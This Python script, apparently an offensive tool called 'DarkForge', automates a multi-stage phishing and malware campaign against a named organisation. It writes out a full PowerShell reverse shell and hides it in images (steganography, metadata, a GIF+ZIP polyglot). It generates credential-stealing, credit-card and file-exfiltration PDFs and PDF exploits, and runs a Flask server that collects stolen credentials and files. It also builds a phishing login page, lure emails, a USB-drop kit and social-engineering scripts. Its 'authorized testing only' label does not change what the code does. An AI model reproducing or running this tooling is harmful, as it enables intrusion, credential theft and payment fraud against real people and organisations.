#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
DarkForge - Multi-Stage Attack Chain Example
مثال على هجوم متعدد المراحل باستخدام PDF + Images + Network
للاختبارات المصرح بها فقط - Authorized Penetration Testing Only
"""

import os
import sys
import time
import json
import random
import base64
import threading
import subprocess
from datetime import datetime
from typing import Dict, List, Optional

# إضافة المسار
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    MAGENTA = '\033[95m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'


class MultiStageAttack:
    """
    هجوم متعدد المراحل - اختبار اختراق متكامل
    المرحلة 1: OSINT وجمع المعلومات
    المرحلة 2: إنشاء PDF بايلودات
    المرحلة 3: إنشاء صور خبيثة
    المرحلة 4: تشغيل سيرفرات الاستماع
    المرحلة 5: إرسال الهجوم (محاكاة)
    المرحلة 6: جمع النتائج والتحليل
    """
    
    def __init__(self, target_name: str = "Acme Corp",
                 lhost: str = "192.168.1.100",
                 lport: int = 4444,
                 output_dir: str = "output/attack"):
        
        self.target_name = target_name
        self.lhost = lhost
        self.lport = lport
        self.output_dir = output_dir
        
        self.stages = {
            "recon": False,
            "pdf_gen": False,
            "image_gen": False,
            "server": False,
            "delivery": False,
            "collection": False
        }
        
        self.results = {
            "start_time": datetime.now().isoformat(),
            "target": target_name,
            "attacker_ip": lhost,
            "payloads_created": [],
            "credentials_stolen": [],
            "files_exfiltrated": [],
            "shells_opened": 0
        }
        
        os.makedirs(output_dir, exist_ok=True)
        os.makedirs(f"{output_dir}/payloads", exist_ok=True)
        os.makedirs(f"{output_dir}/results", exist_ok=True)
        os.makedirs(f"{output_dir}/logs", exist_ok=True)
    
    # ================================================================
    # المرحلة 1: الاستطلاع وجمع المعلومات (Reconnaissance)
    # ================================================================
    
    def stage_1_reconnaissance(self) -> Dict:
        """جمع معلومات عن الهدف"""
        print(f"\n{Colors.CYAN}{Colors.BOLD}[+] المرحلة 1/6: الاستطلاع وجمع المعلومات{Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Target: {self.target_name}{Colors.RESET}")
        
        info = {
            "target": self.target_name,
            "timestamp": datetime.now().isoformat(),
            "techniques_planned": [
                "PDF Phishing - Fake Login Form",
                "PDF Reverse Shell - PowerShell Stager",
                "Image Steganography - LSB Injection",
                "Image Polyglot - GIF+ZIP",
                "PDF CVE Exploitation - CVE-2023-21608"
            ],
            "payload_types": [
                {"type": "reverse_shell_windows", "port": self.lport},
                {"type": "reverse_shell_linux", "port": self.lport + 1},
                {"type": "keylogger", "port": self.lport + 2},
                {"type": "screenshot_capture", "port": self.lport + 3}
            ],
            "delivery_methods": [
                "Email attachment with PDF",
                "USB drop with PDF + QR code image",
                "Compromised website with PDF download",
                "Social media DM with link to PDF"
            ]
        }
        
        # حفظ معلومات الاستطلاع
        with open(f"{self.output_dir}/recon_info.json", 'w') as f:
            json.dump(info, f, indent=4)
        
        print(f"{Colors.GREEN}[✓] معلومات الاستطلاع محفوظة: {self.output_dir}/recon_info.json{Colors.RESET}")
        print(f"{Colors.GREEN}[✓] تم التخطيط لـ {len(info['techniques_planned'])} تقنية هجوم{Colors.RESET}")
        
        self.stages["recon"] = True
        self.results["recon_info"] = info
        return info
    
    # ================================================================
    # المرحلة 2: إنشاء PDF بايلودات
    # ================================================================
    
    def stage_2_pdf_generation(self) -> List[str]:
        """إنشاء جميع ملفات PDF الهجومية"""
        print(f"\n{Colors.CYAN}{Colors.BOLD}[+] المرحلة 2/6: إنشاء PDF بايلودات ({self.lhost}:{self.lport}){Colors.RESET}")
        
        pdf_files = []
        pdf_dir = f"{self.output_dir}/payloads/pdf"
        os.makedirs(pdf_dir, exist_ok=True)
        
        # استيراد الوحدات
        sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
        from darkforge.modules.pdf_cred_stealer import PDFCredentialStealer
        from darkforge.modules.pdf_cve_exploiter import PDFCVEExploiter
        
        # 1. PDF - Credential Stealer (Microsoft)
        print(f"{Colors.YELLOW}[*] إنشاء PDF سرقة بيانات - Microsoft...{Colors.RESET}")
        stealer = PDFCredentialStealer()
        cred_pdf = stealer.generate_fake_login_pdf(
            output_file=f"{pdf_dir}/microsoft_login.pdf",
            company_name="microsoft",
            callback_url=f"http://{self.lhost}:{self.lport + 10}/steal"
        )
        pdf_files.append(cred_pdf)
        print(f"{Colors.GREEN}[✓] {cred_pdf}{Colors.RESET}")
        
        # 2. PDF - Windows Update Phishing
        print(f"{Colors.YELLOW}[*] إنشاء PDF تحديث Windows مزيف...{Colors.RESET}")
        update_pdf = stealer.generate_fake_update_pdf(
            output_file=f"{pdf_dir}/windows_update.pdf",
            callback_url=f"http://{self.lhost}:{self.lport + 10}/steal"
        )
        pdf_files.append(update_pdf)
        print(f"{Colors.GREEN}[✓] {update_pdf}{Colors.RESET}")
        
        # 3. PDF - Credit Card Stealer
        print(f"{Colors.YELLOW}[*] إنشاء PDF سرقة بطاقات ائتمان...{Colors.RESET}")
        cc_pdf = stealer.generate_credit_card_form_pdf(
            output_file=f"{pdf_dir}/payment_invoice.pdf",
            callback_url=f"http://{self.lhost}:{self.lport + 10}/steal"
        )
        pdf_files.append(cc_pdf)
        print(f"{Colors.GREEN}[✓] {cc_pdf}{Colors.RESET}")
        
        # 4. PDF - CVE Exploit
        print(f"{Colors.YELLOW}[*] إنشاء PDF استغلال CVE-2023-21608...{Colors.RESET}")
        exploiter = PDFCVEExploiter()
        cve_pdf = exploiter.exploit_cve_2023_21608(
            output_file=f"{pdf_dir}/security_update_CVE-2023-21608.pdf",
            lhost=self.lhost,
            lport=self.lport
        )
        pdf_files.append(cve_pdf)
        print(f"{Colors.GREEN}[✓] {cve_pdf}{Colors.RESET}")
        
        # 5. PDF - Sandbox Escape
        print(f"{Colors.YELLOW}[*] إنشاء PDF تهرب من Sandbox...{Colors.RESET}")
        sandbox_pdf = exploiter.exploit_cve_2024_20887(
            output_file=f"{pdf_dir}/sandbox_escape.pdf",
            lhost=self.lhost,
            lport=self.lport
        )
        pdf_files.append(sandbox_pdf)
        print(f"{Colors.GREEN}[✓] {sandbox_pdf}{Colors.RESET}")
        
        # 6. PDF - File Exfiltrator
        print(f"{Colors.YELLOW}[*] إنشاء PDF سارق ملفات...{Colors.RESET}")
        exfil_pdf = stealer.generate_file_exfiltrator_pdf(
            output_file=f"{pdf_dir}/security_audit_report.pdf",
            callback_url=f"http://{self.lhost}:{self.lport + 10}/exfil"
        )
        pdf_files.append(exfil_pdf)
        print(f"{Colors.GREEN}[✓] {exfil_pdf}{Colors.RESET}")
        
        self.stages["pdf_gen"] = True
        self.results["payloads_created"].extend(pdf_files)
        
        print(f"{Colors.GREEN}[+] تم إنشاء {len(pdf_files)} ملف PDF{Colors.RESET}")
        return pdf_files
    
    # ================================================================
    # المرحلة 3: إنشاء صور خبيثة
    # ================================================================
    
    def stage_3_image_generation(self, image_path: str = None) -> List[str]:
        """إنشاء صور خبيثة تحتوي على بايلودات"""
        print(f"\n{Colors.CYAN}{Colors.BOLD}[+] المرحلة 3/6: إنشاء صور خبيثة{Colors.RESET}")
        
        image_files = []
        img_dir = f"{self.output_dir}/payloads/images"
        os.makedirs(img_dir, exist_ok=True)
        
        # استخدام صورة افتراضية إن لم توجد
        if image_path is None or not os.path.exists(image_path):
            # إنشاء صورة اختبارية
            try:
                from PIL import Image
                img = Image.new('RGB', (800, 600), color=(73, 109, 137))
                img.save(f"{img_dir}/test_image.png")
                image_path = f"{img_dir}/test_image.png"
                print(f"{Colors.YELLOW}[*] تم إنشاء صورة اختبارية: {image_path}{Colors.RESET}")
            except:
                print(f"{Colors.RED}[!] لا يمكن إنشاء صورة. استخدم --image للصورة الأصلية{Colors.RESET}")
                return []
        
        # إنشاء Reverse Shell Script
        ps_shell = f'''$c=New-Object System.Net.Sockets.TCPClient('{self.lhost}',{self.lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()}};$c.Close()'''
        
        shell_path = f"{img_dir}/shell.ps1"
        with open(shell_path, 'w') as f:
            f.write(ps_shell)
        
        # 1. LSB Steganography
        print(f"{Colors.YELLOW}[*] إخفاء Reverse Shell في الصورة (LSB)...{Colors.RESET}")
        try:
            from darkforge.core.image_stego import ImageSteganographyEngine
            engine = ImageSteganographyEngine()
            lsb_img = engine.lsb_encode(
                image_path,
                shell_path,
                f"{img_dir}/profile_lsb.png",
                bits_per_channel=2,
                encrypt=True,
                password="DarkForge2024"
            )
            image_files.append(lsb_img)
            print(f"{Colors.GREEN}[✓] {lsb_img}{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[✗] LSB: {e}{Colors.RESET}")
        
        # 2. Metadata Hiding
        print(f"{Colors.YELLOW}[*] إخفاء بايلود في Metadata...{Colors.RESET}")
        try:
            meta_img = engine.metadata_encode(
                image_path,
                shell_path,
                f"{img_dir}/company_logo_meta.png"
            )
            image_files.append(meta_img)
            print(f"{Colors.GREEN}[✓] {meta_img}{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[✗] Metadata: {e}{Colors.RESET}")
        
        # 3. Polyglot GIF+ZIP
        print(f"{Colors.YELLOW}[*] إنشاء Polyglot GIF+ZIP...{Colors.RESET}")
        try:
            # إنشاء ZIP صغير
            import zipfile
            zip_path = f"{img_dir}/archive.zip"
            with zipfile.ZipFile(zip_path, 'w') as zf:
                zf.writestr('payload.bat', f'start powershell -c "{ps_shell}"')
            
            polyglot_img = engine.polyglot_encode(
                image_path,
                zip_path,
                f"{img_dir}/animation_polyglot.gif",
                "gif+zip"
            )
            image_files.append(polyglot_img)
            print(f"{Colors.GREEN}[✓] {polyglot_img}{Colors.RESET}")
            os.remove(zip_path)
        except Exception as e:
            print(f"{Colors.RED}[✗] Polyglot: {e}{Colors.RESET}")
        
        # 4. QR Code Exploit
        print(f"{Colors.YELLOW}[*] إنشاء QR Code بايلود...{Colors.RESET}")
        try:
            qr_img = engine.qr_exploit_encode(
                image_path,
                shell_path,
                f"{img_dir}/qr_scan_me.png",
                website_url=f"http://{self.lhost}:{self.lport + 10}/payload"
            )
            if qr_img:
                image_files.append(qr_img)
                print(f"{Colors.GREEN}[✓] {qr_img}{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[✗] QR Code: {e}{Colors.RESET}")
        
        # تنظيف الملف المؤقت
        os.remove(shell_path)
        
        self.stages["image_gen"] = True
        self.results["payloads_created"].extend(image_files)
        
        print(f"{Colors.GREEN}[+] تم إنشاء {len(image_files)} صورة خبيثة{Colors.RESET}")
        return image_files
    
    # ================================================================
    # المرحلة 4: تشغيل سيرفرات الاستماع
    # ================================================================
    
    def stage_4_start_servers(self) -> Dict:
        """تشغيل سيرفرات الاستماع"""
        print(f"\n{Colors.CYAN}{Colors.BOLD}[+] المرحلة 4/6: تشغيل سيرفرات الاستماع{Colors.RESET}")
        
        servers = {}
        
        # 1. Reverse Shell Listener
        print(f"{Colors.YELLOW}[*] تحضير Reverse Shell Listener على port {self.lport}...{Colors.RESET}")
        servers["reverse_shell"] = {
            "port": self.lport,
            "command": f"nc -lvnp {self.lport}",
            "status": "ready"
        }
        print(f"{Colors.GREEN}[✓] أمر التشغيل: nc -lvnp {self.lport}{Colors.RESET}")
        
        # 2. HTTP Server for payload download
        http_port = self.lport + 10
        print(f"{Colors.YELLOW}[*] تحضير HTTP Server على port {http_port}...{Colors.RESET}")
        servers["http_server"] = {
            "port": http_port,
            "command": f"python3 -m http.server {http_port} --directory {self.output_dir}/payloads",
            "status": "ready"
        }
        print(f"{Colors.GREEN}[✓] أمر التشغيل: python3 -m http.server {http_port}{Colors.RESET}")
        
        # 3. Credential Capture Server
        cred_port = self.lport + 20
        print(f"{Colors.YELLOW}[*] تحضير Credential Capture Server على port {cred_port}...{Colors.RESET}")
        
        cred_server_script = f'''
from flask import Flask, request
import json, os

app = Flask(__name__)

@app.route('/steal', methods=['GET', 'POST'])
def steal():
    data = request.args.get('data') or request.get_data(as_text=True)
    with open('{self.output_dir}/results/stolen_credentials.txt', 'a') as f:
        f.write(data + '\\n')
    print(f'[+] Credentials captured: {{data[:100]}}...')
    return 'OK'

@app.route('/exfil', methods=['POST'])
def exfil():
    data = request.get_data(as_text=True)
    with open('{self.output_dir}/results/exfiltrated_files.json', 'a') as f:
        f.write(data + '\\n')
    print(f'[+] Files exfiltrated: {{len(data)}} bytes')
    return 'OK'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port={cred_port})
'''
        with open(f"{self.output_dir}/cred_server.py", 'w') as f:
            f.write(cred_server_script)
        
        servers["cred_server"] = {
            "port": cred_port,
            "command": f"python3 {self.output_dir}/cred_server.py",
            "status": "ready"
        }
        print(f"{Colors.GREEN}[✓] أمر التشغيل: python3 {self.output_dir}/cred_server.py{Colors.RESET}")
        
        # 4. Phishing Server
        phishing_port = self.lport + 30
        print(f"{Colors.YELLOW}[*] تحضير Phishing Server على port {phishing_port}...{Colors.RESET}")
        
        phishing_html = f'''
<!DOCTYPE html>
<html>
<head><title>{self.target_name} - Secure Login</title></head>
<body>
    <h1>{self.target_name} - Employee Portal</h1>
    <form action="http://{self.lhost}:{cred_port}/steal" method="POST">
        <input type="text" name="username" placeholder="Username"><br>
        <input type="password" name="password" placeholder="Password"><br>
        <input type="submit" value="Login">
    </form>
</body>
</html>
'''
        with open(f"{self.output_dir}/payloads/index.html", 'w') as f:
            f.write(phishing_html)
        
        servers["phishing_server"] = {
            "port": phishing_port,
            "command": f"cd {self.output_dir}/payloads && python3 -m http.server {phishing_port}",
            "status": "ready"
        }
        print(f"{Colors.GREEN}[✓] Phishing page ready at: http://{self.lhost}:{phishing_port}{Colors.RESET}")
        
        self.stages["server"] = True
        self.results["servers"] = servers
        
        # حفظ معلومات السيرفرات
        with open(f"{self.output_dir}/server_config.json", 'w') as f:
            json.dump(servers, f, indent=4)
        
        print(f"\n{Colors.GREEN}[+] جميع السيرفرات جاهزة!{Colors.RESET}")
        print(f"\n{Colors.CYAN}لبدء الهجوم، قم بتشغيل الأوامر التالية في terminal منفصل:{Colors.RESET}")
        for name, info in servers.items():
            print(f"  {Colors.YELLOW}{name}:{Colors.RESET} {info['command']}")
        
        return servers
    
    # ================================================================
    # المرحلة 5: محاكاة الإرسال (Delivery)
    # ================================================================
    
    def stage_5_delivery_simulation(self) -> Dict:
        """محاكاة إرسال البايلودات للضحية"""
        print(f"\n{Colors.CYAN}{Colors.BOLD}[+] المرحلة 5/6: تجهيز وسائل الإرسال{Colors.RESET}")
        
        delivery = {
            "email_templates": [],
            "usb_drop_files": [],
            "social_engineering_scripts": []
        }
        
        # 1. قوالب البريد الإلكتروني
        print(f"{Colors.YELLOW}[*] إنشاء قوالب البريد الإلكتروني...{Colors.RESET}")
        
        email_templates = [
            {
                "subject": f"URGENT: Security Update Required - {self.target_name}",
                "body": f"Dear employee,\n\nWe have detected a critical security vulnerability in your system.\nPlease download and open the attached PDF to apply the security patch immediately.\n\nIT Security Team\n{self.target_name}",
                "attachment": "security_update_CVE-2023-21608.pdf"
            },
            {
                "subject": "Invoice #INV-{random.randint(10000,99999)} - Payment Required",
                "body": f"Dear customer,\n\nPlease find attached your invoice for this month.\nReview and make payment via the secure payment form in the PDF.\n\nBilling Department\n{self.target_name}",
                "attachment": "payment_invoice.pdf"
            },
            {
                "subject": "Your Microsoft 365 Account Needs Verification",
                "body": "Dear user,\n\nWe detected unauthorized access attempts to your account.\nVerify your identity by opening the attached document.\n\nMicrosoft Security Team",
                "attachment": "microsoft_login.pdf"
            }
        ]
        
        for i, template in enumerate(email_templates):
            template["body"] = template["body"].replace("{random.randint(10000,99999)}", str(random.randint(10000,99999)))
            with open(f"{self.output_dir}/results/email_template_{i+1}.txt", 'w') as f:
                f.write(f"Subject: {template['subject']}\n\n{template['body']}\n\nAttachment: {template['attachment']}")
            delivery["email_templates"].append(template)
        
        print(f"{Colors.GREEN}[✓] تم إنشاء {len(email_templates)} قالب بريد إلكتروني{Colors.RESET}")
        
        # 2. تجهيز USB Drop
        print(f"{Colors.YELLOW}[*] تجهيز ملفات USB Drop...{Colors.RESET}")
        usb_dir = f"{self.output_dir}/usb_drop"
        os.makedirs(usb_dir, exist_ok=True)
        
        # نسخ الملفات المنشأة
        import shutil
        for root, dirs, files in os.walk(f"{self.output_dir}/payloads"):
            for file in files:
                if file.endswith('.pdf') or file.endswith('.png') or file.endswith('.gif'):
                    shutil.copy2(os.path.join(root, file), usb_dir)
        
        delivery["usb_drop_files"] = os.listdir(usb_dir)
        print(f"{Colors.GREEN}[✓] تم تجهيز {len(delivery['usb_drop_files'])} ملف لـ USB Drop{Colors.RESET}")
        
        # 3. Social Engineering Scripts
        print(f"{Colors.YELLOW}[*] إنشاء نصوص الهندسة الاجتماعية...{Colors.RESET}")
        
        se_scripts = [
            f"مرحباً، أنا من فريق تقنية المعلومات في {self.target_name}. أحتاج منك فتح الملف المرفق لتطبيق التحديثات الأمنية الضرورية.",
            f"تحية طيبة، مرفق فاتورة الاشتراك لهذا الشهر. يرجى مراجعة المرفق وإتمام عملية الدفع.",
            f"عزيزي المستخدم، تم اكتشاف محاولة اختراق لحسابك. يرجى فتح الملف المرفق لتأكيد هويتك."
        ]
        
        with open(f"{self.output_dir}/results/social_engineering_scripts.txt", 'w') as f:
            for i, script in enumerate(se_scripts):
                f.write(f"Script {i+1}:\n{script}\n\n{'='*50}\n\n")
        
        delivery["social_engineering_scripts"] = se_scripts
        print(f"{Colors.GREEN}[✓] تم إنشاء {len(se_scripts)} سيناريو هندسة اجتماعية{Colors.RESET}")
        
        self.stages["delivery"] = True
        self.results["delivery"] = delivery
        
        return delivery
    
    # ================================================================
    # المرحلة 6: جمع النتائج والتحليل
    # ================================================================
    
    def stage_6_collection_and_analysis(self) -> Dict:
        """جمع النتائج وتحليلها"""
        print(f"\n{Colors.CYAN}{Colors.BOLD}[+] المرحلة 6/6: جمع النتائج والتحليل{Colors.RESET}")
        
        # إحصائيات الهجوم
        self.results["end_time"] = datetime.now().isoformat()
        self.results["duration"] = str(
            datetime.fromisoformat(self.results["end_time"]) - 
            datetime.fromisoformat(self.results["start_time"])
        )
        
        # إنشاء التقرير النهائي
        report = f"""
{'='*60}
        DarkForge - Penetration Test Report
{'='*60}

Target:             {self.target_name}
Attacker IP:        {self.lhost}
Date:               {self.results['start_time']}
Duration:           {self.results['duration']}

{'='*60}
STAGE 1: RECONNAISSANCE
{'='*60}
✓ Target information gathered
✓ {len(self.results['recon_info']['techniques_planned'])} attack techniques planned
✓ {len(self.results['recon_info']['delivery_methods'])} delivery methods prepared

{'='*60}
STAGE 2: PDF PAYLOADS GENERATED
{'='*60}
"""
        for pdf in [f for f in self.results['payloads_created'] if f.endswith('.pdf')]:
            report += f"✓ {os.path.basename(pdf)} ({os.path.getsize(pdf)} bytes)\n"
        
        report += f"""
{'='*60}
STAGE 3: IMAGE PAYLOADS GENERATED
{'='*60}
"""
        for img in [f for f in self.results['payloads_created'] if not f.endswith('.pdf')]:
            report += f"✓ {os.path.basename(img)} ({os.path.getsize(img)} bytes)\n"
        
        report += f"""
{'='*60}
STAGE 4: LISTENER SERVERS READY
{'='*60}
"""
        if 'servers' in self.results:
            for name, info in self.results['servers'].items():
                report += f"✓ {name}: {info['command']}\n"
        
        report += f"""
{'='*60}
STAGE 5: DELIVERY MATERIALS
{'='*60}
✓ {len(self.results['delivery']['email_templates'])} email templates
✓ {len(self.results['delivery']['usb_drop_files'])} USB drop files
✓ {len(self.results['delivery']['social_engineering_scripts'])} social engineering scripts

{'='*60}
SUMMARY
{'='*60}
Total Payloads:     {len(self.results['payloads_created'])}
PDF Files:          {len([f for f in self.results['payloads_created'] if f.endswith('.pdf')])}
Image Files:        {len([f for f in self.results['payloads_created'] if not f.endswith('.pdf')])}
Servers Ready:      {len(self.results.get('servers', {}))}

{'='*60}
RECOMMENDATIONS
{'='*60}
1. Enable Protected View in Adobe Reader
2. Disable JavaScript in PDF readers
3. Train employees on phishing awareness
4. Implement email attachment scanning
5. Use endpoint detection and response (EDR)
6. Block macro execution in PDF documents

{'='*60}
        END OF REPORT
{'='*60}
        """
        
        report_path = f"{self.output_dir}/results/pentest_report.txt"
        with open(report_path, 'w') as f:
            f.write(report)
        
        print(f"{Colors.GREEN}[✓] تم إنشاء التقرير النهائي: {report_path}{Colors.RESET}")
        
        # حفظ النتائج كـ JSON
        results_path = f"{self.output_dir}/results/attack_results.json"
        with open(results_path, 'w') as f:
            json.dump(self.results, f, indent=4)
        print(f"{Colors.GREEN}[✓] نتائج الهجوم محفوظة: {results_path}{Colors.RESET}")
        
        self.stages["collection"] = True
        
        # عرض التقرير
        print(f"\n{Colors.CYAN}{report}{Colors.RESET}")
        
        return self.results
    
    # ================================================================
    # تشغيل الهجوم الكامل
    # ================================================================
    
    def run_full_attack(self, image_path: str = None) -> Dict:
        """تشغيل الهجوم متعدد المراحل بالكامل"""
        print(f"{Colors.RED}{Colors.BOLD}")
        print("██████╗  █████╗ ██████╗ ██╗  ██╗███████╗ ██████╗ ██████╗  ██████╗ ███████╗")
        print("██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝██╔════╝██╔════╝ ██╔══██╗██╔════╝ ██╔════╝")
        print("██║  ██║███████║██████╔╝█████╔╝ █████╗  ██║  ███╗██████╔╝██║  ███╗█████╗  ")
        print("██║  ██║██╔══██║██╔══██╗██╔═██╗ ██╔══╝  ██║   ██║██╔══██╗██║   ██║██╔══╝  ")
        print("██████╔╝██║  ██║██║  ██║██║  ██╗██║     ╚██████╔╝██║  ██║╚██████╔╝███████╗")
        print("╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝")
        print(f"{Colors.RESET}")
        print(f"{Colors.CYAN}  Multi-Stage Attack Chain{Colors.RESET}")
        print(f"{Colors.YELLOW}  Target: {self.target_name}{Colors.RESET}")
        print(f"{Colors.YELLOW}  Attacker: {self.lhost}:{self.lport}{Colors.RESET}")
        print(f"{Colors.RED}  للاختبارات المصرح بها فقط!{Colors.RESET}")
        print(f"{'='*60}")
        
        start_time = time.time()
        
        # تنفيذ المراحل
        self.stage_1_reconnaissance()
        time.sleep(1)
        
        self.stage_2_pdf_generation()
        time.sleep(1)
        
        self.stage_3_image_generation(image_path)
        time.sleep(1)
        
        self.stage_4_start_servers()
        time.sleep(1)
        
        self.stage_5_delivery_simulation()
        time.sleep(1)
        
        results = self.stage_6_collection_and_analysis()
        
        total_time = time.time() - start_time
        
        print(f"\n{Colors.GREEN}{Colors.BOLD}[+] الهجوم متعدد المراحل اكتمل!{Colors.RESET}")
        print(f"{Colors.GREEN}    الوقت المستغرق: {total_time:.2f} ثانية{Colors.RESET}")
        print(f"{Colors.GREEN}    الملفات المنشأة: {len(results['payloads_created'])}{Colors.RESET}")
        print(f"{Colors.GREEN}    التقرير: {self.output_dir}/results/pentest_report.txt{Colors.RESET}")
        
        return results


def main():
    """الدالة الرئيسية لتشغيل الهجوم"""
    import argparse
    
    parser = argparse.ArgumentParser(description='DarkForge - Multi-Stage Attack Chain')
    parser.add_argument('--target', default='Acme Corp', help='اسم الهدف')
    parser.add_argument('--lhost', default='192.168.1.100', help='IP الخاص بك')
    parser.add_argument('--lport', type=int, default=4444, help='Port')
    parser.add_argument('--image', help='صورة أساسية للإخفاء')
    parser.add_argument('--output', default='output/attack', help='مجلد الإخراج')
    parser.add_argument('--skip-recon', action='store_true', help='تخطي الاستطلاع')
    parser.add_argument('--skip-pdf', action='store_true', help='تخطي PDF')
    parser.add_argument('--skip-images', action='store_true', help='تخطي الصور')
    
    args = parser.parse_args()
    
    attack = MultiStageAttack(
        target_name=args.target,
        lhost=args.lhost,
        lport=args.lport,
        output_dir=args.output
    )
    
    if args.skip_recon and args.skip_pdf and args.skip_images:
        # تشغيل الكامل
        attack.run_full_attack(args.image)
    else:
        # تشغيل مخصص
        if not args.skip_recon:
            attack.stage_1_reconnaissance()
        if not args.skip_pdf:
            attack.stage_2_pdf_generation()
        if not args.skip_images:
            attack.stage_3_image_generation(args.image)
        attack.stage_4_start_servers()
        attack.stage_5_delivery_simulation()
        attack.stage_6_collection_and_analysis()


if __name__ == '__main__':
    main()
